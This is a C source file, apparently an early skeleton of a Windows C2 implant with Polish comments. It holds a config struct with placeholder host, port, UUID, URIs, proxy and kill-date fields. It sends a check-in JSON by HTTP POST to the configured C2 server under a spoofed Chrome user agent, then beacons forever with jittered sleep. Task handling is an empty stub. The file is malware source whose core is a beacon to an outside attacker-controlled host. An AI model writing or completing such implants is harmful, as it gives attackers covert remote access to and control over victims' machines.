#include <stdlib.h>
#include <stdint.h>
#include <windows.h>
#include <wininet.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include "cJSON.h"
typedef struct {
    int port; 
    int interval; 
    int jitter;
    int eec; //tak na prawdę to bool XD
    char host[256];
    char get_uri[64];
    char proxy_host[128];    //
    char post_uri[64];
    char query_path_name[64];
    char proxy_port[16]; //
    char proxy_user[64]; //
    char proxy_pass[64]; //
    char uuid[40];
    char killdate[32];  //
} implant_config;

//implant_config config = {
//    .host = "REPLACE_ME_HOST",
//    .port = REPLACE_ME_PORT,     
//    .uuid = "REPLACE_ME_UUID",
//    .interval = REPLACE_ME_INTERVAL, //
//    .jitter = REPLACE_ME_JITTER,      //
//    .get_uri = "REPLACE_ME_GET_URI",  
//    .post_uri = "REPLACE_ME_POST_URI",
//    .query_path_name = "REPLACE_ME_QUERY_PATH_NAME",
//    .eec = REPLACE_ME_EEC,        
//    .proxy_host = "REPLACE_ME_PROXY_HOST", //
//    .proxy_port = "REPLACE_ME_PROXY_PORT", //
//    .proxy_user = "REPLACE_ME_PROXY_USER", // 
//    .proxy_pass = "REPLACE_ME_PROXY_PASS", //
//    .killdate = "REPLACE_ME_KILLDATE" //
//};

implant_config config = {
    .host = "REPLACE_ME_HOST",
    .port = 1337,     
    .uuid = "REPLACE_ME_UUID",
    .interval = 420, //
    .jitter = 69,      //
    .get_uri = "REPLACE_ME_GET_URI",  
    .post_uri = "REPLACE_ME_POST_URI",
    .query_path_name = "REPLACE_ME_QUERY_PATH_NAME",
    .eec = 1,        
    .proxy_host = "REPLACE_ME_PROXY_HOST", //
    .proxy_port = "PROXY_PORT", //
    .proxy_user = "REPLACE_ME_PROXY_USER", // 
    .proxy_pass = "REPLACE_ME_PROXY_PASS", //
    .killdate = "REPLACE_ME_KILLDATE" //
};

void send_c2_post_request(char* json_data) {
    HINTERNET hInternet = InternetOpen("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return;

    HINTERNET hConnect = InternetConnect(hInternet, config.host, config.port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hInternet); return; }

    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", config.post_uri, NULL, NULL, NULL, INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return; }

    const char* headers = "Content-Type: application/json\r\n";
    
    if (HttpSendRequest(hRequest, headers, -1, json_data, strlen(json_data))) {
        printf("wyslano.\n");
        
        char buffer[1024];
        DWORD bytesRead;
        if (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead)) {
            buffer[bytesRead] = '\0';
            printf("Odpowiedź serwera: %s\n", buffer);
        }
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}
bool checkin(){
        char json_buff[150];
    snprintf(json_buff,sizeof(json_buff),"{\"action\": \"checkin\", \"uuid\": \"%s\", \"os\": \"NOT IMPLEMENTED\", \"user\": \"NOT IMPLEMENTED\", \"host\": \"NOT IMPLEMENTED\", \"pid\": 0, \"architecture\": \"x64\"}",config.uuid);
    send_c2_post_request(json_buff); //checkin do serwera
}
	
void get_tasks(){

return;
}

bool sleep_with_jitter(int interval, int jitter){
    int variation = (interval * jitter)/100;
    int sleep = (interval - variation) + rand()%(2*variation+1);
        Sleep(sleep * 1000);

return 0;
}
int main(){
	char json_buff[512];
	checkin();
//main loop
    for(;;){
        get_tasks();
        sleep_with_jitter(config.interval,config.jitter);
    }

	return 0;
}